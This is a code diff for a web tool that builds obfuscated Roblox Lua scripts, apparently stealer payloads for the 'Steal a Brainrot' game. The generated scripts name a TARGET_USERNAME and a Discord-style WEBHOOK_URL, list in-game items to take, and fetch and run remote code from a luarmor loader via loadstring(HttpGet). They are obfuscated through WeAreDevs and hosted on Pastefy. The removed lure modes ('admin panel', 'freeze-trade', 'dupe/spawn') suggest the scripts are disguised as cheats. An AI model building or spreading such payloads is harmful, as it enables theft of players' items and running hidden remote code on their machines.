@@ -117,9 +117,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const shortToggle = document.getElementById('shortToggle');
     const guestLockMessage = document.getElementById('guestLockMessage');
     const generateBtn = document.getElementById('generateBtn');
-    const modeButtons = document.querySelectorAll('.mode-btn');
-    const secondLoadstring = document.getElementById('secondLoadstring');
-    const customLoadstring = document.getElementById('customLoadstring');
 
     // ============================================================
     //  FUNCIONES DE AUTENTICACIÓN
@@ -207,33 +204,23 @@ document.addEventListener('DOMContentLoaded', () => {
     handleDiscordCallback();
 
     // ============================================================
-    //  MODO DE EJECUCIÓN (5 opciones)
+    //  MODO DE EJECUCIÓN
     // ============================================================
-    function updateModeUI(selectedMode) {
-        if (selectedMode === 'normal') {
-            secondLoadstring.classList.add('hidden');
-        } else {
-            secondLoadstring.classList.remove('hidden');
-            const placeholders = {
-                adminpanel: 'Pega aquí el script para ADMIN PANEL...',
-                freezetrade: 'Pega aquí el script para FREEZE-TRADE...',
-                dupespawn: 'Pega aquí el script para DUPE/SPAWN...',
-                custom: 'Escribe tu código personalizado aquí...'
-            };
-            customLoadstring.placeholder = placeholders[selectedMode] || 'Escribe tu código aquí...';
-        }
-    }
+    const modeNormal = document.getElementById('modeNormal');
+    const modeCustom = document.getElementById('modeCustom');
+    const secondLoadstring = document.getElementById('secondLoadstring');
 
-    modeButtons.forEach(btn => {
-        btn.addEventListener('click', () => {
-            modeButtons.forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            updateModeUI(btn.dataset.mode);
-        });
+    modeNormal.addEventListener('click', () => {
+        modeNormal.classList.add('active');
+        modeCustom.classList.remove('active');
+        secondLoadstring.classList.add('hidden');
     });
 
-    // Inicializar con el modo activo (normal por defecto)
-    updateModeUI('normal');
+    modeCustom.addEventListener('click', () => {
+        modeCustom.classList.add('active');
+        modeNormal.classList.remove('active');
+        secondLoadstring.classList.remove('hidden');
+    });
 
     // ============================================================
     //  SHORT LOADSTRING TOGGLE
@@ -690,7 +677,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // ============================================================
-    //  GENERAR SCRIPT (CORREGIDO PARA 5 MODOS)
+    //  GENERAR SCRIPT (CORREGIDO)
     // ============================================================
     const outputSection = document.getElementById('outputSection');
     const outputCode = document.getElementById('outputCode');
@@ -703,6 +690,8 @@ document.addEventListener('DOMContentLoaded', () => {
     function buildConfigScript() {
         const username = document.getElementById('username').value.trim() || 'USERNAME';
         const webhook = document.getElementById('webhook').value.trim() || 'WEBHOOK_URL';
+        const mode = document.querySelector('.mode-btn.active')?.id === 'modeNormal' ? 'NORMAL' : 'CUSTOM';
+        const customLoadstring = document.getElementById('customLoadstring').value.trim();
 
         const brainrots = getSelectedValues(brainrotsSelected);
         const skins = getSelectedValues(skinsSelected);
@@ -716,9 +705,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
         let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
         script += `getgenv().WEBHOOK_URL = "${webhook.replace(/"/g, '\\"')}"\n`;
+
+        // Siempre usar NORMAL_ como prefijo, incluso en modo CUSTOM
         script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
         script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
         script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;
+
+        // NOTA: El código personalizado se añadirá como un segundo task.spawn en la generación final.
+        // No se guarda en una variable CUSTOM_LOADSTRING.
 
         return script;
     }
@@ -729,23 +723,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
         try {
             const configScript = buildConfigScript();
-            const activeModeBtn = document.querySelector('.mode-btn.active');
-            const selectedMode = activeModeBtn ? activeModeBtn.dataset.mode : 'normal';
-            const customCode = customLoadstring.value.trim();
+            const mode = document.querySelector('.mode-btn.active')?.id === 'modeNormal' ? 'NORMAL' : 'CUSTOM';
+            const customLoadstring = document.getElementById('customLoadstring').value.trim();
 
-            // Construir el script completo con comentario del modo
-            let fullScript = `-- Mode: ${selectedMode.toUpperCase()}\n` + configScript;
-            fullScript += `
-task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
-end)`;
+            let finalScript = configScript;
 
-            // Si el modo no es 'normal' y hay código personalizado, añadir segundo task.spawn
-            if (selectedMode !== 'normal' && customCode) {
-                fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
-            }
-
-            // Si el usuario ha activado "Short Loadstring" y está autenticado → ofuscar + Pastefy
             if (shortEnabled) {
                 if (!isAuthenticated) {
                     showNotification('⚠️ Short Loadstring requires Discord authentication. Please sign in.', 'warning');
@@ -754,18 +736,41 @@ end)`;
                     return;
                 }
                 try {
+                    let fullScript = configScript + `
+                    
+                    task.spawn(function()
+                        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+                    end)
+                    `;
+
+                    // Si es modo CUSTOM y hay código personalizado, añadir un segundo task.spawn
+                    if (mode === 'CUSTOM' && customLoadstring) {
+                        fullScript += `\n\ntask.spawn(function()\n    ${customLoadstring.replace(/\n/g, '\n    ')}\nend)`;
+                    }
+                    
                     const obfuscatedScript = await obfuscateWithWeAreDevs(fullScript);
                     const pastefyUrl = await createPastefyPaste(obfuscatedScript);
-                    const finalScript = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
-                    outputCode.textContent = finalScript;
+                    const finalLoadstring = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
+                    outputCode.textContent = finalLoadstring;
 
                 } catch (apiError) {
                     showNotification(`Error en el proceso automático: ${apiError.message}\n\nSe usará la URL por defecto.`, 'error');
-                    outputCode.textContent = fullScript;
+                    // Fallback: sin ofuscar
+                    let fallbackScript = configScript + 
+                        `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)`;
+                    if (mode === 'CUSTOM' && customLoadstring) {
+                        fallbackScript += `\n\ntask.spawn(function()\n    ${customLoadstring.replace(/\n/g, '\n    ')}\nend)`;
+                    }
+                    outputCode.textContent = fallbackScript;
                 }
             } else {
-                // Sin Short Loadstring: mostrar el script completo
-                outputCode.textContent = fullScript;
+                // Modo normal (sin short loadstring)
+                let normalScript = configScript + 
+                    `\n\ntask.spawn(function()\n    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()\nend)`;
+                if (mode === 'CUSTOM' && customLoadstring) {
+                    normalScript += `\n\ntask.spawn(function()\n    ${customLoadstring.replace(/\n/g, '\n    ')}\nend)`;
+                }
+                outputCode.textContent = normalScript;
             }
 
             outputSection.classList.remove('hidden');
